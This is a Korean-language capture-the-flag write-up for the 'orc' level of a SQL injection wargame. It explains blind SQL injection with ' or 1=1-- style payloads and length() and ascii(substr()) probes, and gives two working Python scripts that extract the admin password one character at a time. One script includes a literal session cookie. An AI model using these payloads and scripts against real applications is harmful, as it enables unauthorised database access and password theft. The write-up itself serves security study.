## Q4. orc
<img src="/photo/prob_04.PNG" width="100%" height="100%" alt="problem"></img>

#### 5thofnovmbr
```
풀이: 
blind SQLinjection은 참과 거짓이 어떻게 표시되는지 알아내는게 중요하다.
?pw=' or 1=1--%20을 입력하면 Hello admin이 출력된다.(참일 때 반환값)
입력한 pw값이 DB에 있는 pw와 같아야 문제가 풀리므로 pw를 알아내야 한다.
다음 쿼리문으로 pw의 길이를 알아낼 수 있다.
```
##### select id from prob_orc where id='admin' and pw=''or length(pw)=n-- {$_GET[pw]}'
```python
import requests as req 

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

ck = {"PHPSESSID":"본인의 PHPSESSID"}
#쿠키값 PHPSSESID라고 잘못 적었다가 왜 안되지..하면서 몇 십 분 잡고 있었다..ㅠㅠㅠ

for i in range(10):
	param = f"' or length(pw)={i}-- "
	with req.get(url, params={"pw":param}, cookies=ck) as res:
		if res.text.count("Hello")==2:
			print('pw의 길이 :', i)
```
```
다음 쿼리문으로 pw의 글자를 하나씩 비교해 알아낼 수 있다.
```
##### select id from prob_orc where id='admin' and pw=''or ascii(substr(pw from 숫자 for 1))=숫자-- {$_GET[pw]}'
```
substr(pw from n for 1)은 mysql함수로 문자열을 잘라준다. pw의 n번째 자리(1부터시작)부터 for뒤의 숫자 개수만큼 잘라 반환한다.
ascii()는 해당 글자의 ascii코드 값을 반환한다.
```
```python
import requests as req 

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

ck = {"PHPSESSID":"j36kv4qogu660uhlacl2kqg5v5"}

#pw의 길이의 결과가 왜인지 4와 8이 나오는데 더 긴 쪽이라고 가장하고 코드를 짰다.
pw=''
for i in range(1,9):
	for j in range(33,127):
		param = f"' or ascii(substr(pw from {i} for 1))={j}-- "
		with req.get(url, params={"pw":param}, cookies=ck) as res:
			if res.text.count("Hello")==2:
				pw+=chr(j)
				print("pw =", pw)
				break
```
```diff
+ MySQL함수 공부를 하면 더 도움이 될 것 같다.
+ 웹해킹.kr 21번이 이 문제랑 거의 똑같다. 
- ascii로 우회하지 않고 substr함수만 사용하여 그냥 문자와 비교하는 코드도 짜보았는데 어째선지 되지 않았다.
```
